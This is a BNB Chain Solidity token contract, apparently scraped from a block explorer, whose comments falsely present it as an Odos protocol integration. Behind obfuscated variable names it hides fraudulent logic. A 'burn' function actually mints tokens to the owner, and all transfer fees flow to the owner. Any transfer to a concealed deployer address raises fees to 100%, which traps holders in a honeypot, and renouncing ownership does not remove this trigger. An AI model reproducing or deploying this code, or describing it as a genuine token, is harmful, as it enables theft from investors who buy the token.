/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

////////////////////////////////////////////////////////
//odosprotocol
//Odos leverages a unique algorithm to traverse a large universe of possible token swap combinations and non-linear paths, 
//delivering greater savings to its users
// We're excited to announce our integration with 
// Odos’s Smart Order Routing (SOR) utilizes a unique patented algorithm to search significantly more complex (non-linear) 
//paths through an unlimited set of connector tokens.
//https://www.odos.xyz/
//https://twitter.com/odosprotocol
////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity =0.8.11;
contract odosprotocol {
uint256 public constant yfEGSz = 9+1;
address public  CxmAmB = address(0);
uint256 public  uUbCSU = 100000000000000000;
string public  symbol = "odospro";
address public  MMmjjK = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  qTtahI = address(0);
uint256 public  JhYbNr = 10000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  AvlbaW = address(0);
uint256 private  jatLlU = 10000000000000;
uint256 public  wQfeyk = 1000000000000000000;
address public owner;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => uint256) public balanceOf;
string public  name = "odospro";
uint8 public constant decimals = 18;
address public  wGGUnL = address(0);
uint256 public  SDTSHl = 10000000000000000000000000000;
address public  nFWTNg = address(0);
uint256 public  mDejhV = 100000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  tXrqfN = 10000000000000000;
uint256 public  WlfTVk = 100000000000000000000000;
address private  siJMOC = address(0);
uint256 public  kgKYXW = 100000000000000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor ()  {
siJMOC = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "KxrALq");
require(to != address(0), "KxrALq");
require(amount <= balanceOf[from], "KxrALq");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* yfEGSz/jatLlU ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==siJMOC){
jatLlU = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}